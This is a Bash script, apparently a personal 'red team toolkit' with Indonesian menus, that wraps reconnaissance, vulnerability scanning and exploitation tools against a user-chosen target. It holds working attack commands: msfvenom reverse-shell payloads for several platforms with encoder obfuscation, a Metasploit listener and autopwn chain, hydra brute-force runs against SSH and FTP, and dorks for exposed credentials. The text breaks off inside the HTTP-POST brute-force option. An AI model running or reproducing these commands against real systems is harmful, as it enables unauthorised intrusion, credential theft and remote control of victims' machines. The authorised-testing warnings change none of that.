#!/usr/bin/env bash
# ============================================================
#  RED TEAM TOOLKIT buat yang malas ngetik
#  CLI — ALL LINUX COMPATIBLE
#  Author  : Riski Akbar - firefly1368-code
#  License : For authorized penetration testing only
#  PERINGATAN: Gunakan HANYA pada sistem yang Anda miliki
#              atau memiliki izin tertulis!
# ============================================================

# ── Warna Terminal ──────────────────────────────────────────
RED='\033[0;31m';  LRED='\033[1;31m'
GRN='\033[0;32m';  LGRN='\033[1;32m'
YLW='\033[0;33m';  LYLW='\033[1;33m'
BLU='\033[0;34m';  LBLU='\033[1;34m'
CYN='\033[0;36m';  LCYN='\033[1;36m'
MAG='\033[0;35m';  LMAG='\033[1;35m'
WHT='\033[1;37m';  GRY='\033[0;37m'
NC='\033[0m';      BOLD='\033[1m'
DIM='\033[2m'

# ── Source Compatibility Module ──────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPAT_MODULE="$SCRIPT_DIR/compat.sh"

if [[ -f "$COMPAT_MODULE" ]]; then
    source "$COMPAT_MODULE"
else
    echo -e "${LYLW}[!] compat.sh tidak ditemukan di $SCRIPT_DIR${NC}"
    echo -e "${LYLW}[!] Compatibility check dilewati.${NC}"
    # Dummy detect_os jika module tidak ada
    detect_os() {
        OS_NAME=$(uname -sr)
        OS_FAMILY="Unknown"
        OS_ARCH=$(uname -m)
        PKG_MANAGER="unknown"
    }
fi

# ── Konfigurasi Global ───────────────────────────────────────
TOOLKIT_VERSION="2.1"
LOG_DIR="$HOME/.redteam_logs"
REPORT_DIR="$HOME/redteam_reports"
WORDLIST_DIR="/usr/share/wordlists"
ROCKYOU="$WORDLIST_DIR/rockyou.txt"
DIRBUSTER_COMMON="$WORDLIST_DIR/dirbuster/directory-list-2.3-medium.txt"
SESSION_LOG="$LOG_DIR/session_$(date +%Y%m%d_%H%M%S).log"
TARGET=""
SCOPE_FILE="$LOG_DIR/scope.txt"

mkdir -p "$LOG_DIR" "$REPORT_DIR"

# ── Fungsi Logging ───────────────────────────────────────────
log() {
    local level="$1"; shift
    local msg="$*"
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$ts][$level] $msg" >> "$SESSION_LOG"
    case "$level" in
        INFO)  echo -e "${LBLU}[*]${NC} $msg" ;;
        OK)    echo -e "${LGRN}[+]${NC} $msg" ;;
        WARN)  echo -e "${LYLW}[!]${NC} $msg" ;;
        ERR)   echo -e "${LRED}[-]${NC} $msg" ;;
        CMD)   echo -e "${LCYN}[>]${NC} $msg" ;;
    esac
}

# ── Cek Tool (distro-aware) ──────────────────────────────────
check_tool() {
    local t="$1"
    if command -v "$t" &>/dev/null; then
        echo -e "${LGRN}✔${NC} $t"
    else
        # Tampilkan hint install jika ada
        local pkg=""
        case "$PKG_MANAGER" in
            apt)     pkg="${TOOL_PACKAGES_APT[$t]:-}" ;;
            dnf|yum) pkg="${TOOL_PACKAGES_DNF[$t]:-}" ;;
            pacman)  pkg="${TOOL_PACKAGES_PACMAN[$t]:-}" ;;
        esac
        if [[ -n "$pkg" ]]; then
            echo -e "${LRED}✘${NC} $t ${DIM}(install: $PKG_MANAGER install $pkg)${NC}"
        else
            echo -e "${LRED}✘${NC} $t ${DIM}(tidak tersedia via $PKG_MANAGER)${NC}"
        fi
    fi
}

check_all_tools() {
    echo -e "\n${BOLD}${WHT}[ STATUS TOOLS — $OS_FAMILY / $PKG_MANAGER ]${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    local tools=(
        nmap masscan nikto gobuster ffuf dirb wfuzz
        sqlmap hydra john hashcat medusa ncrack
        msfconsole msfvenom
        nc socat curl wget whois dig nslookup
        dnsenum dnsrecon fierce theHarvester
        smbclient enum4linux rpcclient crackmapexec
        ldapsearch snmpwalk onesixtyone
        responder wireshark tshark tcpdump
        openssl sslscan wpscan
        git python3 searchsploit
        proxychains4 arpspoof
    )
    local i=0
    for t in "${tools[@]}"; do
        printf "  %-45s" "$(check_tool "$t")"
        ((i++)); [[ $((i%2)) -eq 0 ]] && echo || true
    done
    echo -e "\n"
}

# ── Install (Distro-Aware) ────────────────────────────────────
install_missing() {
    # Gunakan compat module jika tersedia
    if declare -f compat_install_tools &>/dev/null; then
        detect_os
        compat_install_tools
    else
        # Fallback ke apt
        log INFO "Fallback: menggunakan apt..."
        sudo apt-get update -qq
        sudo apt-get install -y nmap socat curl wget git python3 tcpdump openssl
        log OK "Done!"
    fi
}

# ── Banner ────────────────────────────────────────────────────
show_banner() {
    clear
    echo -e "${LRED}"
    cat << 'EOF'
 ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
 ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
 ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
 ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

 ⣿⣿⣿⣿⣿⣷⣿⣿⣿⡅⡹⢿⠆⠙⠋⠉⠻⠿⣿⣿⣿⣿⣿⣿⣮⠻⣦⡙⢷⡑⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠡⠌⠂⣙⠻⣛⠻⠷⠐⠈⠛⢱⣮⣷⣽⣿
⣿⣿⣿⣿⡇⢿⢹⣿⣶⠐⠁⠀⣀⣠⣤⠄⠀⠀⠈⠙⠻⣿⣿⣿⣦⣵⣌⠻⣷⢝⠦⠚⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣻⣿⣊⡃⠀⣙⠿⣿⣿⣿⣎⢮⡀⢮⣽⣿⣿
⢿⣿⣿⣿⣧⡸⡎⡛⡩⠖⠀⣴⣿⣿⣿⠀⠀⠀⠀⠸⠇⠀⠙⢿⣿⣿⣿⣷⣌⢷⣑⢷⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⠶⠛⠉⠀⠁⠀⠈⠈⠀⠠⠜⠻⣿⣆⢿⣼⣿⣿⣿
⢐⣿⣿⣿⣿⣧⢧⣧⢻⣦⢀⣹⣿⣿⣿⣇⠀⠄⠀⠀⠀⡀⠀⠈⢻⣿⣿⣿⣿⣷⣝⢦⡹⠷⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠁⠀⠀⠀⠁⠀⠀⠀⠱⣶⣄⡀⠀⠈⠛⠜⣿⣿⣿⣿
⠀⠊⢫⣿⣏⣿⡌⣼⣄⢫⡌⣿⣿⣿⣿⣿⣦⡈⠲⣄⣤⣤⡡⢀⣠⣿⣿⣿⣿⣿⣿⣷⣼⣍⢬⣦⡙⣿⣿⣿⣿⣿⣯⢁⡄⠀⡀⡀⠀⠄⢈⣠⢪⠀⣿⣿⣿⣦⠀⢉⢂⠹⡿⣿⣿
⠀⠀⠄⢹⢃⢻⣟⠙⣿⣦⠱⢻⣿⣿⣿⣿⣿⣿⣷⣬⣍⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡙⢿⣼⡿⣿⣿⣿⣿⣿⣷⣄⠘⣱⢦⣤⡴⡿⢈⣼⣿⣿⣿⣇⣴⣶⣮⣅⢻⣿⡏
⠀⠀⠈⠹⣇⢡⢿⡆⠻⣿⣷⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⡻⣿⣟⣻⣿⣿⣿⣿⣷⣦⣥⣬⣤⣴⣾⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⡜⠃
⠀⠀⠀⢀⣘⠈⢂⠃⣧⡹⣿⣷⡄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣅⡙⢿⣟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⡕⠂
⠀⠀⠀⠀⠀⠀⠛⢷⣜⢷⡌⠻⣿⣿⣦⣝⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣹⣷⣦⣹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠉⠃⠀
EOF
    echo -e "${NC}${BOLD}${WHT}  T O O L K I T  CLI  v${TOOLKIT_VERSION}${NC}"
    echo -e "${GRY}         Compatible: All Major Linux Distros${NC}"
    echo -e "${DIM}         $OS_NAME | $OS_ARCH | pkg: $PKG_MANAGER${NC}"
    echo -e "${LRED}   ⚠  HANYA untuk pengujian AUTHORIZED/LEGAL ⚠${NC}"
    echo ""
    [[ -n "$TARGET" ]] && echo -e " ${BOLD}Target aktif:${NC} ${LYLW}$TARGET${NC}"
    echo ""
}

press_enter() { echo; read -rp " Tekan [Enter] untuk lanjut..." _; }

# ── Set Target ────────────────────────────────────────────────
set_target() {
    echo -e "\n${BOLD}[ SET TARGET ]${NC}"
    read -rp " Masukkan IP/Domain/Range target: " TARGET
    read -rp " Nama engagement/scope: " SCOPE_NAME
    {
        echo "Target: $TARGET"
        echo "Scope: $SCOPE_NAME"
        echo "Tanggal: $(date)"
    } >> "$SCOPE_FILE"
    log OK "Target diset ke: $TARGET"
}

# ════════════════════════════════════════════════════════════
#  FASE 1 — RECONNAISSANCE
# ════════════════════════════════════════════════════════════
menu_recon() {
    while true; do
        show_banner
        echo -e "${BOLD}${LCYN}[ FASE 1 — RECONNAISSANCE ]${NC}  Target: ${LYLW}${TARGET:-belum diset}${NC}\n"
        echo -e "  ${WHT}── Passive Reconnaissance ──────────────────────────────${NC}"
        echo -e "  ${LGRN}1${NC}  WHOIS Lookup"
        echo -e "  ${LGRN}2${NC}  DNS Enumeration (dig/nslookup/dnsenum)"
        echo -e "  ${LGRN}3${NC}  DNS Bruteforce (dnsrecon + fierce)"
        echo -e "  ${LGRN}4${NC}  Subdomain Discovery (theHarvester)"
        echo -e "  ${LGRN}5${NC}  Email Harvesting (theHarvester)"
        echo -e "  ${LGRN}6${NC}  OSINT - Shodan/Censys (manual)"
        echo -e "  ${LGRN}7${NC}  Google Dorks Builder"
        echo -e "  ${WHT}── Active Reconnaissance ────────────────────────────────${NC}"
        echo -e "  ${LGRN}8${NC}  Ping Sweep (nmap -sn)"
        echo -e "  ${LGRN}9${NC}  Port Scan - Quick (nmap Top 1000)"
        echo -e "  ${LGRN}10${NC} Port Scan - Full (nmap All ports)"
        echo -e "  ${LGRN}11${NC} Port Scan - Stealth SYN"
        echo -e "  ${LGRN}12${NC} Service & Version Detection"
        echo -e "  ${LGRN}13${NC} OS Detection + Traceroute"
        echo -e "  ${LGRN}14${NC} Fast Masscan (all ports)"
        echo -e "  ${LGRN}15${NC} SMB Recon (enum4linux + smbclient)"
        echo -e "  ${LGRN}16${NC} SNMP Enumeration"
        echo -e "  ${LGRN}17${NC} LDAP Enumeration"
        echo -e "  ${LGRN}18${NC} RPC Enumeration"
        echo -e "  ${LGRN}19${NC} Banner Grabbing (nc/curl)"
        echo -e "  ${LGRN}20${NC} Web Tech Detection (whatweb)"
        echo -e "  ${LGRN}b${NC}  Kembali ke Menu Utama\n"
        read -rp " Pilih: " opt
        [[ -z "$TARGET" && "$opt" != "b" ]] && { log WARN "Set target dulu!"; set_target; continue; }
        local OUT="$LOG_DIR/recon_$(date +%H%M%S)"
        case "$opt" in
            1)  log CMD "whois $TARGET"
                whois "$TARGET" 2>/dev/null | tee "${OUT}_whois.txt"; press_enter ;;
            2)  log CMD "DNS enumeration"
                echo "=== DIG ===" && dig "$TARGET" ANY +short 2>/dev/null || \
                    nslookup "$TARGET" 2>/dev/null
                echo "=== NS Records ===" && dig NS "$TARGET" +short 2>/dev/null
                echo "=== MX Records ===" && dig MX "$TARGET" +short 2>/dev/null
                echo "=== TXT Records ===" && dig TXT "$TARGET" +short 2>/dev/null
                echo "=== AXFR Attempt ===" && dig AXFR "$TARGET" 2>/dev/null
                nslookup "$TARGET" 2>/dev/null | tee "${OUT}_dns.txt"; press_enter ;;
            3)  log CMD "dnsrecon + fierce"
                command -v dnsrecon &>/dev/null && dnsrecon -d "$TARGET" 2>/dev/null | tee "${OUT}_dnsrecon.txt" \
                    || log WARN "dnsrecon tidak terinstall"
                command -v fierce &>/dev/null && fierce --domain "$TARGET" 2>/dev/null | tee -a "${OUT}_dnsrecon.txt" \
                    || log WARN "fierce tidak terinstall"; press_enter ;;
            4)  log CMD "theHarvester subdomain"
                read -rp " Source [google/bing/all]: " src
                if command -v theHarvester &>/dev/null; then
                    theHarvester -d "$TARGET" -b "${src:-google}" -l 500 | tee "${OUT}_harvester.txt"
                else
                    log WARN "theHarvester tidak tersedia. Install: pip3 install theHarvester"
                fi; press_enter ;;
            5)  log CMD "theHarvester email harvest"
                command -v theHarvester &>/dev/null && \
                    theHarvester -d "$TARGET" -b all -l 500 | grep -E "@" | tee "${OUT}_emails.txt" \
                    || log WARN "theHarvester tidak tersedia"; press_enter ;;
            6)  echo -e "\n${LYLW}Buka manual:${NC}"
                echo "  Shodan  : https://www.shodan.io/search?query=$TARGET"
                echo "  Censys  : https://search.censys.io/search?resource=hosts&q=$TARGET"
                echo "  Fofa    : https://fofa.info/result?qbase64=$(echo -n "ip=\"$TARGET\"" | base64)"
                echo "  GreyNoise: https://viz.greynoise.io/ip/$TARGET"; press_enter ;;
            7)  echo -e "\n${LYLW}Google Dorks untuk $TARGET:${NC}"
                echo "  site:$TARGET filetype:pdf"
                echo "  site:$TARGET filetype:doc OR filetype:xls OR filetype:ppt"
                echo "  site:$TARGET inurl:admin OR inurl:login OR inurl:panel"
                echo "  site:$TARGET intext:password OR intext:credentials"
                echo "  site:$TARGET ext:php intitle:\"Index of\""
                echo "  intitle:\"phpMyAdmin\" site:$TARGET"
                echo "  \"$TARGET\" inurl:\"*.php?id=\""
                echo "  site:$TARGET -www"; press_enter ;;
            8)  log CMD "nmap -sn $TARGET"
                nmap -sn "$TARGET" | tee "${OUT}_pingsweep.txt"; press_enter ;;
            9)  log CMD "nmap -T4 --top-ports 1000 $TARGET"
                nmap -T4 --top-ports 1000 -oN "${OUT}_quickscan.txt" "$TARGET"; press_enter ;;
            10) log CMD "nmap -p- -T4 $TARGET"
                nmap -p- -T4 --min-rate 5000 -oN "${OUT}_fullscan.txt" "$TARGET"; press_enter ;;
            11) log CMD "nmap -sS -T2 $TARGET (Stealth)"
                sudo nmap -sS -T2 -oN "${OUT}_stealth.txt" "$TARGET"; press_enter ;;
            12) log CMD "nmap -sV -sC $TARGET"
                nmap -sV -sC --version-intensity 9 -oN "${OUT}_services.txt" "$TARGET"; press_enter ;;
            13) log CMD "nmap -O --traceroute $TARGET"
                sudo nmap -O --traceroute -oN "${OUT}_os.txt" "$TARGET"; press_enter ;;
            14) log CMD "masscan -p0-65535 $TARGET"
                read -rp " Rate (default 10000): " rate
                if command -v masscan &>/dev/null; then
                    sudo masscan "$TARGET" -p0-65535 --rate="${rate:-10000}" -oL "${OUT}_masscan.txt"
                else
                    log WARN "masscan tidak tersedia. Fallback ke nmap -p-"
                    nmap -p- --min-rate 5000 "$TARGET" -oN "${OUT}_masscan.txt"
                fi; press_enter ;;
            15) log CMD "enum4linux + smbclient"
                command -v enum4linux &>/dev/null && enum4linux -a "$TARGET" | tee "${OUT}_smb.txt" \
                    || log WARN "enum4linux tidak tersedia"
                echo "=== SMB Shares ===" && smbclient -L "//$TARGET" -N 2>/dev/null | tee -a "${OUT}_smb.txt"; press_enter ;;
            16) log CMD "SNMP Enumeration"
                command -v onesixtyone &>/dev/null && onesixtyone "$TARGET" 2>/dev/null | tee "${OUT}_snmp.txt" \
                    || log WARN "onesixtyone tidak tersedia"
                command -v snmpwalk &>/dev/null && snmpwalk -c public -v2c "$TARGET" 2>/dev/null | tee -a "${OUT}_snmp.txt" \
                    || log WARN "snmpwalk tidak tersedia"; press_enter ;;
            17) log CMD "LDAP Enumeration"
                command -v ldapsearch &>/dev/null && ldapsearch -x -H "ldap://$TARGET" -b "" -s base 2>/dev/null | tee "${OUT}_ldap.txt" \
                    || log WARN "ldapsearch tidak tersedia"; press_enter ;;
            18) log CMD "RPC Enumeration"
                command -v rpcclient &>/dev/null && rpcclient -U "" -N "$TARGET" -c "enumdomusers; enumshares; srvinfo" 2>/dev/null | tee "${OUT}_rpc.txt" \
                    || log WARN "rpcclient tidak tersedia"; press_enter ;;
            19) log CMD "Banner Grabbing"
                local nc_cmd=""
                command -v nc &>/dev/null && nc_cmd="nc" || command -v ncat &>/dev/null && nc_cmd="ncat"
                for port in 21 22 23 25 80 110 143 443 3306 3389 8080 8443; do
                    echo -e "${CYN}Port $port:${NC}"
                    if [[ -n "$nc_cmd" ]]; then
                        $nc_cmd -z -v -w2 "$TARGET" "$port" 2>&1 | head -3
                    else
                        curl -s --connect-timeout 2 "http://$TARGET:$port" -o /dev/null -w "%{http_code}" 2>/dev/null
                        echo ""
                    fi
                done | tee "${OUT}_banners.txt"; press_enter ;;
            20) log CMD "whatweb $TARGET"
                if command -v whatweb &>/dev/null; then
                    whatweb -v "http://$TARGET" 2>/dev/null | tee "${OUT}_whatweb.txt"
                else
                    log WARN "whatweb tidak tersedia. Fallback curl headers:"
                    curl -sI "http://$TARGET" 2>/dev/null | tee "${OUT}_whatweb.txt"
                fi; press_enter ;;
            b)  return ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FASE 2 — VULNERABILITY SCANNING
# ════════════════════════════════════════════════════════════
menu_vulnscan() {
    while true; do
        show_banner
        echo -e "${BOLD}${LMAG}[ FASE 2 — VULNERABILITY SCANNING ]${NC}  Target: ${LYLW}${TARGET:-belum diset}${NC}\n"
        echo -e "  ${WHT}── Web Application ────────────────────────────────────${NC}"
        echo -e "  ${LGRN}1${NC}  Nikto Web Scanner (Full)"
        echo -e "  ${LGRN}2${NC}  Nikto SSL/TLS"
        echo -e "  ${LGRN}3${NC}  Directory Bruteforce (gobuster)"
        echo -e "  ${LGRN}4${NC}  Directory Bruteforce (ffuf)"
        echo -e "  ${LGRN}5${NC}  Directory Bruteforce (dirb)"
        echo -e "  ${LGRN}6${NC}  Virtual Host Discovery (ffuf VHOST)"
        echo -e "  ${LGRN}7${NC}  Parameter Fuzzing (ffuf)"
        echo -e "  ${LGRN}8${NC}  SQL Injection Scan (sqlmap)"
        echo -e "  ${LGRN}9${NC}  WordPress Scan (wpscan)"
        echo -e "  ${LGRN}10${NC} Joomla Scan (joomscan)"
        echo -e "  ${LGRN}11${NC} SSL/TLS Scan (sslscan + testssl)"
        echo -e "  ${WHT}── Network / Infrastructure ────────────────────────────${NC}"
        echo -e "  ${LGRN}12${NC} Nmap Vuln Scripts (--script vuln)"
        echo -e "  ${LGRN}13${NC} Nmap SMB Vuln (EternalBlue, etc.)"
        echo -e "  ${LGRN}14${NC} Nmap HTTP Vuln Scripts"
        echo -e "  ${LGRN}15${NC} Searchsploit (cari exploit)"
        echo -e "  ${LGRN}16${NC} CVE Check - Manual Query"
        echo -e "  ${LGRN}17${NC} OpenVAS/GVM Launch"
        echo -e "  ${LGRN}b${NC}  Kembali\n"
        read -rp " Pilih: " opt
        local OUT="$LOG_DIR/vuln_$(date +%H%M%S)"
        local _req_tool=""

        _check_req() {
            if ! command -v "$1" &>/dev/null; then
                local pkg; pkg=$(get_pkg_name "$1" 2>/dev/null || echo "$1")
                log WARN "$1 tidak tersedia. Install: sudo $PKG_MANAGER install $pkg"
                press_enter; return 1
            fi
            return 0
        }

        case "$opt" in
            1)  _check_req nikto && nikto -h "$TARGET" -o "${OUT}_nikto.txt" 2>/dev/null; press_enter ;;
            2)  _check_req nikto && nikto -h "$TARGET" -ssl -p 443 -o "${OUT}_nikto_ssl.txt" 2>/dev/null; press_enter ;;
            3)  _check_req gobuster && {
                    read -rp " Wordlist [Enter=default]: " wl
                    wl="${wl:-$DIRBUSTER_COMMON}"
                    read -rp " Extension [php,html,txt]: " ext
                    gobuster dir -u "http://$TARGET" -w "$wl" -x "${ext:-php,html,txt,bak,old}" \
                        -o "${OUT}_gobuster.txt" -t 50 --timeout 10s 2>/dev/null
                }; press_enter ;;
            4)  _check_req ffuf && {
                    read -rp " Wordlist [Enter=default]: " wl
                    wl="${wl:-$DIRBUSTER_COMMON}"
                    ffuf -u "http://$TARGET/FUZZ" -w "$wl" -o "${OUT}_ffuf.json" \
                        -mc 200,204,301,302,307,401,403 -t 50 2>/dev/null
                }; press_enter ;;
            5)  _check_req dirb && dirb "http://$TARGET" -o "${OUT}_dirb.txt" 2>/dev/null; press_enter ;;
            6)  _check_req ffuf && {
                    read -rp " Domain (misal: domain.com): " domain
                    read -rp " Subdomain wordlist: " wl
                    wl="${wl:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt}"
                    ffuf -u "http://$TARGET" -H "Host: FUZZ.$domain" -w "$wl" \
                        -mc 200,204,301,302,307 -o "${OUT}_vhost.txt" 2>/dev/null
                }; press_enter ;;
            7)  _check_req ffuf && {
                    read -rp " URL dengan FUZZ (contoh: http://site.com/page?id=FUZZ): " fuzz_url
                    ffuf -u "$fuzz_url" -w "$ROCKYOU" -o "${OUT}_param_fuzz.txt" 2>/dev/null
                }; press_enter ;;
            8)  _check_req sqlmap && {
                    read -rp " URL target SQLi (contoh: http://site.com/page?id=1): " sqlurl
                    read -rp " Level [1-5, default 2]: " lvl
                    read -rp " Risk [1-3, default 1]: " risk
                    sqlmap -u "$sqlurl" --level="${lvl:-2}" --risk="${risk:-1}" \
                        --batch --output-dir="${OUT}_sqlmap" 2>/dev/null
                }; press_enter ;;
            9)  _check_req wpscan && {
                    read -rp " URL WordPress: " wpurl
                    read -rp " WPScan API Token (opsional): " wptoken
                    if [[ -n "$wptoken" ]]; then
                        wpscan --url "$wpurl" --api-token "$wptoken" --enumerate u,p,t,vp,vt \
                            -o "${OUT}_wpscan.txt" 2>/dev/null
                    else
                        wpscan --url "$wpurl" --enumerate u,p,t -o "${OUT}_wpscan.txt" 2>/dev/null
                    fi
                }; press_enter ;;
            10) if command -v joomscan &>/dev/null; then
                    read -rp " URL Joomla: " jurl
                    joomscan -u "$jurl" 2>/dev/null | tee "${OUT}_joomla.txt"
                else
                    log WARN "joomscan tidak tersedia. Install: gem install joomscan"
                fi; press_enter ;;
            11) command -v sslscan &>/dev/null && sslscan "$TARGET" 2>/dev/null | tee "${OUT}_ssl.txt" \
                    || log WARN "sslscan tidak tersedia"
                command -v testssl.sh &>/dev/null && testssl.sh "$TARGET" 2>/dev/null | tee -a "${OUT}_ssl.txt" \
                    || log WARN "testssl.sh tidak tersedia"
                press_enter ;;
            12) sudo nmap --script vuln -oN "${OUT}_nmap_vuln.txt" "$TARGET"; press_enter ;;
            13) sudo nmap --script "smb-vuln*" -p 139,445 -oN "${OUT}_smb_vuln.txt" "$TARGET"; press_enter ;;
            14) nmap --script "http-vuln*,http-sql-injection,http-shellshock" \
                    -p 80,443,8080,8443 -oN "${OUT}_http_vuln.txt" "$TARGET"; press_enter ;;
            15) _check_req searchsploit && {
                    read -rp " Keyword searchsploit: " kw
                    searchsploit "$kw" | tee "${OUT}_searchsploit.txt"
                }; press_enter ;;
            16) read -rp " Software + versi (misal: Apache 2.4.49): " sw
                echo "Cari di: https://nvd.nist.gov/vuln/search/results?query=$sw"
                echo "         https://www.exploit-db.com/search?q=$sw"; press_enter ;;
            17) if command -v gvm-start &>/dev/null; then
                    sudo gvm-start 2>/dev/null
                elif command -v openvas &>/dev/null; then
                    sudo openvas 2>/dev/null
                else
                    log WARN "GVM/OpenVAS tidak terinstall."
                    echo "  Debian/Ubuntu: sudo apt install gvm && sudo gvm-setup"
                    echo "  RHEL/CentOS:   sudo dnf install openvas"
                    echo "  Arch:          sudo pacman -S openvas"
                fi; press_enter ;;
            b)  return ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FASE 3 — EXPLOITATION
# ════════════════════════════════════════════════════════════
menu_exploit() {
    while true; do
        show_banner
        echo -e "${BOLD}${LRED}[ FASE 3 — EXPLOITATION ]${NC}  Target: ${LYLW}${TARGET:-belum diset}${NC}\n"
        echo -e "  ${WHT}── Metasploit Framework ────────────────────────────────${NC}"
        echo -e "  ${LGRN}1${NC}  Launch Metasploit Console"
        echo -e "  ${LGRN}2${NC}  MSF AutoPwn (db_autopwn)"
        echo -e "  ${LGRN}3${NC}  Generate Payload (msfvenom)"
        echo -e "  ${LGRN}4${NC}  Start MSF Listener (multi/handler)"
        echo -e "  ${WHT}── Password Attacks ────────────────────────────────────${NC}"
        echo -e "  ${LGRN}5${NC}  Hydra Brute Force (SSH)"
        echo -e "  ${LGRN}6${NC}  Hydra Brute Force (FTP)"
        echo -e "  ${LGRN}7${NC}  Hydra Brute Force (HTTP-POST)"
        echo -e "  ${LGRN}8${NC}  Hydra Brute Force (RDP/SMB/VNC)"
        echo -e "  ${LGRN}9${NC}  Medusa Brute Force"
        echo -e "  ${LGRN}10${NC} Ncrack"
        echo -e "  ${WHT}── Web Exploitation ────────────────────────────────────${NC}"
        echo -e "  ${LGRN}11${NC} SQLmap Exploitation (dump DB)"
        echo -e "  ${LGRN}12${NC} SQLmap OS Shell"
        echo -e "  ${LGRN}13${NC} XSS Payload Generator"
        echo -e "  ${LGRN}14${NC} LFI/RFI Tester (curl)"
        echo -e "  ${WHT}── Network Exploitation ────────────────────────────────${NC}"
        echo -e "  ${LGRN}15${NC} ARP Spoofing (arpspoof)"
        echo -e "  ${LGRN}16${NC} Responder (LLMNR/NBT-NS Poisoning)"
        echo -e "  ${LGRN}17${NC} Reverse Shell Generator"
        echo -e "  ${LGRN}18${NC} Bind Shell Netcat"
        echo -e "  ${LGRN}19${NC} CrackMapExec (SMB lateral)"
        echo -e "  ${LGRN}b${NC}  Kembali\n"
        read -rp " Pilih: " opt
        local OUT="$LOG_DIR/exploit_$(date +%H%M%S)"

        _req() {
            if ! command -v "$1" &>/dev/null; then
                log WARN "$1 tidak tersedia di $OS_FAMILY."
                echo -e "  ${DIM}Install hint: lihat menu Compatibility Check [c]${NC}"
                press_enter; return 1
            fi
            return 0
        }

        case "$opt" in
            1)  _req msfconsole && msfconsole -q; press_enter ;;
            2)  _req msfconsole && msfconsole -q -x "db_connect msf:msf@localhost/msf; db_nmap -sV $TARGET; db_autopwn -e -t -r -s; exit" 2>/dev/null; press_enter ;;
            3)  _req msfvenom && {
                    echo -e "\n${BOLD}Generate msfvenom payload:${NC}"
                    echo "  1) windows/x64/meterpreter/reverse_tcp (.exe)"
                    echo "  2) linux/x86/meterpreter/reverse_tcp (ELF)"
                    echo "  3) php/meterpreter/reverse_tcp (.php)"
                    echo "  4) python/meterpreter/reverse_tcp (.py)"
                    echo "  5) android/meterpreter/reverse_tcp (.apk)"
                    echo "  6) Custom payload"
                    read -rp " Pilih payload: " pp
                    read -rp " LHOST (IP attacker): " lhost
                    read -rp " LPORT [4444]: " lport; lport="${lport:-4444}"
                    case "$pp" in
                        1) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -e x86/shikata_ga_nai -i 3 -o "${OUT}_payload.exe" 2>/dev/null ;;
                        2) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "${OUT}_payload.elf" 2>/dev/null && chmod +x "${OUT}_payload.elf" ;;
                        3) msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "${OUT}_payload.php" 2>/dev/null ;;
                        4) msfvenom -p python/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "${OUT}_payload.py" 2>/dev/null ;;
                        5) msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "${OUT}_payload.apk" 2>/dev/null ;;
                        6) read -rp " Payload: " cpay; read -rp " Format: " cfmt
                           msfvenom -p "$cpay" LHOST="$lhost" LPORT="$lport" -f "$cfmt" -o "${OUT}_custom.$cfmt" 2>/dev/null ;;
                    esac
                    log OK "Payload disimpan di $OUT"
                }; press_enter ;;
            4)  _req msfconsole && {
                    read -rp " LHOST: " lhost; read -rp " LPORT [4444]: " lport; lport="${lport:-4444}"
                    msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
                }; ;;
            5)  _req hydra && {
                    read -rp " Username/userlist: " usr
                    read -rp " Wordlist password [rockyou]: " wl; wl="${wl:-$ROCKYOU}"
                    read -rp " Port SSH [22]: " port; port="${port:-22}"
                    hydra -l "$usr" -P "$wl" -t 4 -s "$port" ssh://"$TARGET" 2>/dev/null | tee "${OUT}_hydra_ssh.txt"
                }; press_enter ;;
            6)  _req hydra && {
                    read -rp " Username/userlist: " usr
                    read -rp " Wordlist [rockyou]: " wl; wl="${wl:-$ROCKYOU}"
                    hydra -l "$usr" -P "$wl" ftp://"$TARGET" 2>/dev/null | tee "${OUT}_hydra_ftp.txt"
                }; press_enter ;;
            7)  _req hydra && {
                    read -rp " URL Form: " furl
                    read -rp " POST data (user=^USER^&pass=^PASS^): " pdata
                    read -rp " String fail: " ffail
                    read -rp " Username: " usr; read -rp " Wordlist: " wl; wl="${wl:-$ROCKYOU}"
